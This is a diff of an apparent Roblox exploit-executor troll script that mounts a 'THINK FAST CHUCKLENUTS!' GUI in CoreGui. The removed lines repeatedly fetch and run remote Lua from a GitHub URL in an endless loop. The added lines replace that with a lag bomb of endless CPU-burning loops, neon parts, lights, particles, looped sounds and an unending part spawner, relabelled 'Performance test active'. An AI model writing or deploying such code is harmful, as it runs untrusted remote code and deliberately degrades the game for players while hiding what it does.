@@ -1,5 +1,5 @@
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "UnknownGui"
+screenGui.Name = "SomeGui"
 screenGui.Parent = game:GetService("CoreGui")
 
 local frame = Instance.new("Frame")
@@ -29,44 +29,90 @@ message.TextScaled = true
 message.Font = Enum.Font.Gotham
 message.Parent = frame
 
-local countdown = Instance.new("TextLabel")
-countdown.Size = UDim2.new(1, -20, 0, 30)
-countdown.Position = UDim2.new(0, 10, 0, 160)
-countdown.BackgroundTransparency = 1
-countdown.Text = "Think fast chucklenuts!"
-countdown.TextColor3 = Color3.new(1, 1, 1)
-countdown.TextScaled = true
-countdown.Font = Enum.Font.Gotham
-countdown.Parent = frame
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -20, 0, 30)
+status.Position = UDim2.new(0, 10, 0, 160)
+status.BackgroundTransparency = 1
+status.Text = "THINK FAST CHUCKLENUTS!"
+status.TextColor3 = Color3.new(1, 1, 1)
+status.TextScaled = true
+status.Font = Enum.Font.Gotham
+status.Parent = frame
 
-local function executeBomb()
-    local loadstringToExecute = [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/MainScripts/main/LocalHub/Main.lua"))()
-    ]]
-    
+local function createPerformanceImpact()
+  
+    for i = 1, 50 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(5, 5, 5)
+        part.Position = Vector3.new(math.random(-100, 100), math.random(10, 50), math.random(-100, 100))
+        part.Anchored = true
+        part.BrickColor = BrickColor.random()
+        part.Material = Enum.Material.Neon
+        part.Parent = workspace
+       
+        local particle = Instance.new("ParticleEmitter")
+        particle.Parent = part
+        
+        local light = Instance.new("PointLight")
+        light.Brightness = 5
+        light.Range = 20
+        light.Parent = part
+  
+        spawn(function()
+            while true do
+                wait(0.01)
 
-    local success, err = pcall(function()
-        loadstring(loadstringToExecute)()
-    end)
-    
-    if not success then
-        warn("Error: " .. err)
+                local x = 0
+                for j = 1, 10000 do
+                    x = x + math.sin(j) * math.cos(j)
+                end
+            end
+        end)
     end
+    
+    for i = 1, 20 do
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(0, 100, 0, 30)
+        label.Position = UDim2.new(0, math.random(0, 200), 0, math.random(0, 200))
+        label.BackgroundTransparency = 0.5
+        label.Text = "Loading..."
+        label.TextColor3 = Color3.new(1, 1, 1)
+        label.Parent = screenGui
+        
+        spawn(function()
+            while true do
+                wait(0.05)
+                label.Position = UDim2.new(0, math.random(0, 200), 0, math.random(0, 200))
+                label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
+            end
+        end)
+    end
+    
+    for i = 1, 10 do
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://" .. tostring(131017227 + i)
+        sound.Looped = true
+        sound.Volume = 0.1
+        sound.Parent = workspace
+        sound:Play()
+    end
+    
+    status.Text = "Performance test active"
 end
 
-local count = 2
-local countdownConnection
-countdownConnection = game:GetService("RunService").Heartbeat:Connect(function()
-    count = count - 1
-    countdown.Text = "Action in " .. math.ceil(count) .. " seconds..."
-    
-    if count <= 0 then
-        countdownConnection:Disconnect()
-        countdown.Text = "TROLLED BY PLASMABYTE"
-        
-        while true do
-            executeBomb()
-            wait(0.1)
+wait(2)
+createPerformanceImpact()
+
+spawn(function()
+    while true do
+        wait(5)
+        for i = 1, 10 do
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(2, 2, 2)
+            part.Position = Vector3.new(math.random(-200, 200), math.random(10, 100), math.random(-200, 200))
+            part.Anchored = true
+            part.BrickColor = BrickColor.random()
+            part.Parent = workspace
         end
     end
 end)
